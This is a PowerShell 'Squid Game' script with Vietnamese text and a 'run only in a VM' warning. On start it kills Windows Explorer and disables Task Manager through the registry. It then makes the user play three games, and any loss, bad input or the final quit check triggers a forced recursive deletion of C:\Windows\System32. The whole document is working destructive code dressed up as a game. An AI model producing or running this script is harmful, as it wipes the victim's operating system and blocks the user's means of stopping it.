# Squid Game: Windows Edition
# 🔥 CẢNH BÁO: CHỈ CHẠY TRÊN MÁY ẢO!

# Ẩn cửa sổ explorer và vô hiệu hóa Task Manager
Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f > $null

# Hàm xóa System32
function Delete-System32 {
    Write-Host "System32 sẽ bị xóa trong 2 phút... Chúc may mắn."
    Start-Sleep -Seconds 120
    Remove-Item -Path "C:\Windows\System32" -Recurse -Force
}

# Hàm kiểm tra nếu người chơi thoát game
function Check-Quit {
    if ($?) { return }
    Write-Host "Bạn đã thoát! Xóa System32 ngay lập tức!"
    Remove-Item -Path "C:\Windows\System32" -Recurse -Force
    exit
}

# 1️⃣ Trò chơi Oẳn Tù Tì
function RockPaperScissors {
    Write-Host "`n🔥 Trò chơi 1: Oẳn Tù Tì Sinh Tử"
    Write-Host "Chọn: (1) Kéo, (2) Búa, (3) Bao"
    
    $choices = @("Kéo", "Búa", "Bao")
    $computerChoice = Get-Random -Minimum 1 -Maximum 4
    $playerChoice = Read-Host "Nhập lựa chọn (1-3)"
    
    if ($playerChoice -lt 1 -or $playerChoice -gt 3) { Delete-System32; return $false }

    Write-Host "Bạn chọn: " $choices[$playerChoice - 1]
    Write-Host "Windows chọn: " $choices[$computerChoice - 1]

    if ($playerChoice -eq $computerChoice) {
        Write-Host "Hòa! Chơi lại..."
        return RockPaperScissors
    } elseif (($playerChoice -eq 1 -and $computerChoice -eq 3) -or
              ($playerChoice -eq 2 -and $computerChoice -eq 1) -or
              ($playerChoice -eq 3 -and $computerChoice -eq 2)) {
        Write-Host "🎉 Bạn thắng!"
        return $true
    } else {
        Delete-System32
        return $false
    }
}

# 2️⃣ Trò chơi Đoán Số (BO5)
function NumberGuessing {
    Write-Host "`n🔥 Trò chơi 2: Đoán Số Tử Thần"
    $playerScore = 0
    $computerScore = 0

    for ($i=1; $i -le 5; $i++) {
        Write-Host "Ván $i/5: Chọn số từ 1 đến 10"
        $playerGuess = Read-Host "Nhập số của bạn"
        $computerGuess = Get-Random -Minimum 1 -Maximum 11
        $correctNumber = Get-Random -Minimum 1 -Maximum 11
        
        if ([math]::Abs($playerGuess - $correctNumber) -le 2) {
            Write-Host "✅ Bạn đoán đúng ($correctNumber)!"
            $playerScore++
        } else {
            Write-Host "❌ Bạn đoán sai. Đáp án: $correctNumber"
        }
        
        if ($computerGuess -eq $playerGuess) {
            Write-Host "❌ Windows đoán đúng số của bạn ($computerGuess)!"
            $computerScore++
        }

        Write-Host "Tỷ số: Bạn [$playerScore] - Windows [$computerScore]"

        if ($playerScore -ge 3) { Write-Host "🎉 Bạn thắng BO5!"; return $true }
        if ($computerScore -ge 3) { Delete-System32; return $false }
    }
    
    Delete-System32
    return $false
}

# 3️⃣ Trò chơi Đấu Súng (BO3)
function GunDuel {
    Write-Host "`n🔥 Trò chơi 3: Đấu Súng Sinh Tử"
    $playerBullets = 0
    $computerBullets = 0
    $playerScore = 0
    $computerScore = 0

    while ($playerScore -lt 2 -and $computerScore -lt 2) {
        Write-Host "`nBạn có [$playerBullets] viên đạn | Windows có [$computerBullets] viên"
        Write-Host "Chọn hành động: (reload/shoot/shield/bomb)"
        $playerAction = Read-Host "Nhập hành động"
        Start-Sleep -Seconds (Get-Random -Minimum 1.5 -Maximum 10)
        $computerAction = if ($computerBullets -eq 0) { "reload" } else { Get-Random -InputObject "reload", "shoot", "shield" }

        Write-Host "Windows chọn: $computerAction"

        if ($playerAction -eq "reload") { $playerBullets++ }
        if ($computerAction -eq "reload") { $computerBullets++ }

        if ($playerAction -eq "shoot") {
            if ($playerBullets -le 0) { Delete-System32; return $false }
            if ($computerAction -eq "reload") { $playerScore++ }
            if ($computerAction -eq "shield") { Write-Host "Windows chặn được đạn!" }
            $playerBullets--
        }

        if ($computerAction -eq "shoot") {
            if ($computerBullets -le 0) { $playerScore++; continue }
            if ($playerAction -eq "reload") { $computerScore++ }
            if ($playerAction -eq "shield") { Write-Host "Bạn chặn được đạn!" }
            $computerBullets--
        }

        if ($playerAction -eq "bomb" -and $playerBullets -ge 5) { Write-Host "💥 Bạn thắng ngay lập tức!"; return $true }
        if ($computerAction -eq "bomb" -and $computerBullets -ge 5) { Delete-System32; return $false }

        Write-Host "Tỷ số: Bạn [$playerScore] - Windows [$computerScore]"
    }

    if ($playerScore -ge 2) { Write-Host "🎉 Bạn thắng BO3!"; return $true }
    Delete-System32
    return $false
}

# Bắt đầu trò chơi
if (RockPaperScissors) {
    if (NumberGuessing) {
        if (GunDuel) {
            Write-Host "`n🎉 Bạn đã thắng cả 3 trò chơi! Chúc mừng!"
            Write-Host "CREDIT: Được phát triển bởi Itz Mina Meo Meo"
            Start-Process explorer.exe
            exit
        }
    }
}

Check-Quit
